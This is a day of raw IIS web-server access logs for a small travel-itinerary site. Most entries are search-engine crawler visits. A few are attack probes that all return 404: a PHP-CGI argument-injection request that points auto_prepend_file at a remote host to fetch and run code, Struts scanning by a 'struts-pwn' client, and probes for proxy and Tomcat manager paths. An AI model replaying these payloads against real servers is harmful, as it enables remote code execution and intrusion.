#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 00:43:35
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 00:43:35 172.31.23.171 GET / - 80 - 180.76.15.11 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 0 5812
2017-04-15 00:44:45 172.31.23.171 GET / - 80 - 180.76.15.149 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
2017-04-15 00:46:00 172.31.23.171 GET / - 80 - 180.76.15.21 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 01:16:50
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 01:16:50 172.31.23.171 GET /Content/css/style-1eztrip.css - 80 - 180.76.15.17 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 0 906
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 01:34:17
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 01:34:17 172.31.23.171 GET / - 80 - 88.168.95.61 - - 200 0 64 5593
2017-04-15 01:39:19 172.31.23.171 GET / - 80 - 180.76.15.151 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
2017-04-15 01:40:19 172.31.23.171 GET / - 80 - 180.76.15.27 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 171
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 02:11:27
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 02:11:27 172.31.23.171 GET /map_ports.html - 80 - 183.129.160.229 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.11;+rv:47.0)+Gecko/20100101+Firefox/47.0 - 404 0 2 828
2017-04-15 02:11:32 172.31.23.171 GET / - 80 - 183.129.160.229 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.11;+rv:47.0)+Gecko/20100101+Firefox/47.0 - 200 0 64 6124
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 02:42:20
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 02:42:20 172.31.23.171 GET / - 80 - 180.76.15.19 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 6312
2017-04-15 02:43:23 172.31.23.171 GET / - 80 - 180.76.15.157 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
2017-04-15 02:58:05 172.31.23.171 GET /robots.txt - 80 - 66.249.73.32 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 0 2 62
2017-04-15 02:58:05 172.31.23.171 GET /Content/Intro/intro.js - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 124
2017-04-15 02:58:06 172.31.23.171 GET /Content/css/style-1eztrip.css - 80 - 66.249.73.32 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 203
2017-04-15 02:58:06 172.31.23.171 GET /Content/Intro/Intro.css - 80 - 66.249.73.35 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 62
2017-04-15 02:58:06 172.31.23.171 GET /Content/Intro/bootstrap-responsive.min.css - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 62
2017-04-15 02:58:08 172.31.23.171 GET /Scripts/Jsfiles/IndexPage.js - 80 - 66.249.73.35 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 156
2017-04-15 02:58:08 172.31.23.171 GET /Scripts/js/Block.ui.js - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 62
2017-04-15 02:58:08 172.31.23.171 GET /Scripts/js/Facebook.js - 80 - 66.249.73.35 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 62
2017-04-15 02:58:09 172.31.23.171 GET /Scripts/Jsfiles/CurrentItenaries.js - 80 - 66.249.73.32 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 62
2017-04-15 02:58:09 172.31.23.171 GET /bundles/IndexCss - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 359
2017-04-15 02:58:11 172.31.23.171 GET /bundles/JsForIndex - 80 - 66.249.73.32 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 1421
2017-04-15 02:58:11 172.31.23.171 GET /Scripts/js/Jquery1.11.1.min.js - 80 - 66.249.73.32 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 78
2017-04-15 02:58:13 172.31.23.171 POST /Trip/QueryStringValues - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 203
2017-04-15 02:58:13 172.31.23.171 POST /Trip/QueryStringValues - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 46
2017-04-15 02:58:14 172.31.23.171 GET /Trip/GetPopularItineraries - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 187
2017-04-15 02:58:14 172.31.23.171 GET /Trip/GetAmazingGetDestination - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 78
2017-04-15 02:58:14 172.31.23.171 GET /Trip/GetDestinationPlace - 80 - 66.249.73.29 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://52.10.216.178/Trip/Index 200 0 0 156
2017-04-15 03:02:21 172.31.23.171 GET /testproxy.php - 80 - 91.196.50.33 Mozilla/5.0+(Windows+NT+5.1;+rv:32.0)+Gecko/20100101+Firefox/31.0 - 404 0 2 202
2017-04-15 03:05:56 172.31.23.171 GET / - 80 - 185.169.230.8 - - 200 0 64 1140
2017-04-15 03:16:03 172.31.23.171 GET /robots.txt - 80 - 208.43.225.85 Mozilla/5.0+(compatible;+SiteExplorer/1.1b;++http://siteexplorer.info/Backlink-Checker-Spider/) - 404 0 2 281
2017-04-15 03:16:08 172.31.23.171 GET / - 80 - 208.43.225.85 Mozilla/5.0+(compatible;+SiteExplorer/1.1b;++http://siteexplorer.info/Backlink-Checker-Spider/) - 200 0 0 156
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 03:43:12
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 03:43:12 172.31.23.171 GET / - 80 - 180.76.15.163 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5640
2017-04-15 03:44:17 172.31.23.171 GET / - 80 - 180.76.15.29 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 04:46:46
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 04:46:46 172.31.23.171 GET / - 80 - 180.76.15.136 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5656
2017-04-15 04:48:00 172.31.23.171 GET / - 80 - 180.76.15.148 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 05:39:07
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 05:39:07 172.31.23.171 GET / - 80 - 180.76.15.144 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 6140
2017-04-15 05:39:51 172.31.23.171 GET / - 80 - 180.76.15.33 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 06:04:28
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 06:04:28 172.31.23.171 GET /cgi-bin/php -d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n 80 - 191.96.249.97 - - 404 0 0 890
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 06:44:56
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 06:44:56 172.31.23.171 GET / - 80 - 180.76.15.157 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5640
2017-04-15 06:46:06 172.31.23.171 GET / - 80 - 180.76.15.154 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 156
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 07:33:49
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 07:33:49 172.31.23.171 GET /current_config/Account1 - 443 - 60.191.38.77 Mozilla/5.0 - 404 0 0 828
2017-04-15 07:39:24 172.31.23.171 GET / - 80 - 180.76.15.134 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5031
2017-04-15 07:40:20 172.31.23.171 GET / - 80 - 180.76.15.146 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 08:40:25
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 08:40:25 172.31.23.171 GET / - 80 - 180.76.15.158 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5656
2017-04-15 08:41:20 172.31.23.171 GET / - 80 - 180.76.15.7 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 171
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 09:39:59
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 09:39:59 172.31.23.171 GET / - 80 - 180.76.15.139 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5734
2017-04-15 09:40:55 172.31.23.171 GET / - 80 - 180.76.15.11 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 10:00:00
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 10:00:00 172.31.23.171 GET / - 80 - 122.225.98.178 struts-pwn+(https://github.com/mazen160/struts-pwn) - 200 0 0 531
2017-04-15 10:00:19 172.31.23.171 GET /login/ - 80 - 122.225.98.178 struts-pwn+(https://github.com/mazen160/struts-pwn) - 404 0 0 281
2017-04-15 10:00:23 172.31.23.171 GET / - 443 - 122.225.98.178 struts-pwn+(https://github.com/mazen160/struts-pwn) - 200 0 0 625
2017-04-15 10:00:29 172.31.23.171 GET /login/login.action - 443 - 122.225.98.178 struts-pwn+(https://github.com/mazen160/struts-pwn) - 404 0 2 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 10:27:41
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 10:27:41 172.31.23.171 GET / - 80 - 185.169.230.8 - - 200 0 64 7296
2017-04-15 10:40:37 172.31.23.171 GET / - 80 - 180.76.15.136 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 171
2017-04-15 10:41:44 172.31.23.171 GET / - 80 - 180.76.15.17 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
2017-04-15 10:43:19 172.31.23.171 GET / - 80 - 139.162.114.70 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/50.0.2661.102+Safari/537.36 - 200 0 0 546
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 11:39:59
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 11:39:59 172.31.23.171 GET / - 80 - 180.76.15.18 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5750
2017-04-15 11:40:58 172.31.23.171 GET / - 80 - 180.76.15.155 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 12:46:32
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 12:46:32 172.31.23.171 GET / - 80 - 180.76.15.158 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5734
2017-04-15 12:47:42 172.31.23.171 GET / - 80 - 180.76.15.137 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 203
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 13:16:58
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 13:16:58 172.31.23.171 GET /Content/Intro/intro.js - 80 - 180.76.15.138 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 0 406
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 13:32:52
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 13:32:52 172.31.23.171 GET /robots.txt - 80 - 207.46.13.16 Mozilla/5.0+(compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm) - 404 0 2 15
2017-04-15 13:37:18 172.31.23.171 GET / - 80 - 207.46.13.140 Mozilla/5.0+(compatible;+bingbot/2.0;++http://www.bing.com/bingbot.htm) - 200 0 0 5484
2017-04-15 13:39:05 172.31.23.171 GET / - 80 - 180.76.15.159 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
2017-04-15 13:40:06 172.31.23.171 GET / - 80 - 180.76.15.19 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 14:41:51
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 14:41:51 172.31.23.171 GET / - 80 - 180.76.15.20 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5750
2017-04-15 14:42:55 172.31.23.171 GET / - 80 - 180.76.15.140 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 15:40:57
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 15:40:57 172.31.23.171 GET / - 80 - 180.76.15.153 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5796
2017-04-15 15:41:57 172.31.23.171 GET / - 80 - 180.76.15.140 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 171
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 16:46:50
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 16:46:50 172.31.23.171 GET / - 80 - 180.76.15.26 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5625
2017-04-15 16:48:02 172.31.23.171 GET / - 80 - 180.76.15.147 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 17:39:56
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 17:39:56 172.31.23.171 GET / - 80 - 180.76.15.28 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5703
2017-04-15 17:40:48 172.31.23.171 GET / - 80 - 180.76.15.9 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 17:58:29
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 17:58:29 172.31.23.171 GET /manager/html - 80 - 123.249.79.2 Mozilla/5.0+(compatible;+MSIE+10.0;+Windows+NT+6.2;+WOW64;+Trident/6.0) - 404 0 0 312
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 18:17:50
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 18:17:50 172.31.23.171 GET / - 80 - 180.76.15.146 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 0 406
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 18:45:07
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 18:45:07 172.31.23.171 GET / - 80 - 180.76.15.157 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5718
2017-04-15 18:46:18 172.31.23.171 GET / - 80 - 180.76.15.5 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 203
2017-04-15 18:51:11 172.31.23.171 GET /Content/Intro/intro.js - 80 - 180.76.15.141 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 0 406
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 19:13:42
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 19:13:42 172.31.23.171 GET /Trip/ContactUsMessage - 80 - 46.229.168.66 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 200 0 0 1328
2017-04-15 19:13:55 172.31.23.171 GET /Trip/AboutUs - 80 - 46.229.168.68 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 200 0 0 93
2017-04-15 19:14:13 172.31.23.171 GET /Trip/Index - 80 - 46.229.168.67 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 200 0 0 4453
2017-04-15 19:14:25 172.31.23.171 GET /Trip/TermsConditions - 80 - 46.229.168.65 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 200 0 0 218
2017-04-15 19:14:47 172.31.23.171 GET /Trip/ViewMyProfile - 80 - 46.229.168.69 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 302 0 0 93
2017-04-15 19:14:51 172.31.23.171 GET / - 80 - 46.229.168.66 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 200 0 0 171
2017-04-15 19:15:09 172.31.23.171 GET /Trip/Help - 80 - 46.229.168.65 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 200 0 0 156
2017-04-15 19:15:19 172.31.23.171 GET /Trip/MyTrips - 80 - 46.229.168.68 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 302 0 0 78
2017-04-15 19:18:29 172.31.23.171 GET /robots.txt - 80 - 46.229.164.99 Mozilla/5.0+(compatible;+SemrushBot/1.2~bl;++http://www.semrush.com/bot.html) - 404 0 2 78
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 19:40:15
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 19:40:15 172.31.23.171 GET / - 80 - 180.76.15.159 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5640
2017-04-15 19:41:11 172.31.23.171 GET / - 80 - 180.76.15.18 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 19:57:51
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 19:57:51 172.31.23.171 GET /bundles/IndexCss - 80 - 180.76.15.147 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 0 750
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 20:33:21
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 20:33:21 172.31.23.171 GET / - 443 - 139.162.113.204 Mozilla/5.0+(Windows+NT+10.0;+WOW64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/50.0.2661.102+Safari/537.36 - 200 0 64 5687
2017-04-15 20:41:14 172.31.23.171 GET /robots.txt - 80 - 199.21.99.205 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 0 2 93
2017-04-15 20:41:18 172.31.23.171 GET /favicon.ico - 80 - 199.21.99.205 Mozilla/5.0+(compatible;+YandexBot/3.0;++http://yandex.com/bots) - 404 0 2 93
2017-04-15 20:43:11 172.31.23.171 GET / - 80 - 180.76.15.150 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 234
2017-04-15 20:44:23 172.31.23.171 GET / - 80 - 180.76.15.18 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
2017-04-15 20:58:57 172.31.23.171 HEAD / - 443 - 138.197.64.216 Netcraft+SSL+Server+Survey+-+contact+info@netcraft.com - 200 0 0 93
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 21:41:44
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 21:41:44 172.31.23.171 GET / - 80 - 180.76.15.20 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5796
2017-04-15 21:42:46 172.31.23.171 GET / - 80 - 180.76.15.13 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
2017-04-15 21:44:39 172.31.23.171 GET / - 80 - 185.169.230.8 - - 200 0 64 2437
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 22:44:33
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 22:44:33 172.31.23.171 GET / - 80 - 180.76.15.159 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5671
2017-04-15 22:45:43 172.31.23.171 GET / - 80 - 180.76.15.12 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 218
2017-04-15 22:58:21 172.31.23.171 OPTIONS / - 80 - 187.222.18.67 Microsoft-WebDAV-MiniRedir/5.1.2600 - 200 0 0 265
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 23:37:49
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 23:37:49 172.31.23.171 GET / - 80 - 180.76.15.159 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 5734
2017-04-15 23:38:42 172.31.23.171 GET / - 80 - 180.76.15.29 Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html) - 200 0 64 187
#Software: Microsoft Internet Information Services 8.5
#Version: 1.0
#Date: 2017-04-15 23:59:32
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2017-04-15 23:59:32 172.31.23.171 GET / - 443 - 93.174.95.106 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/34.0.1847.137+Safari/537.36 - 200 0 0 6187
2017-04-15 23:59:32 172.31.23.171 GET / - 443 - 93.174.95.106 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/34.0.1847.137+Safari/537.36 - 200 0 0 2093
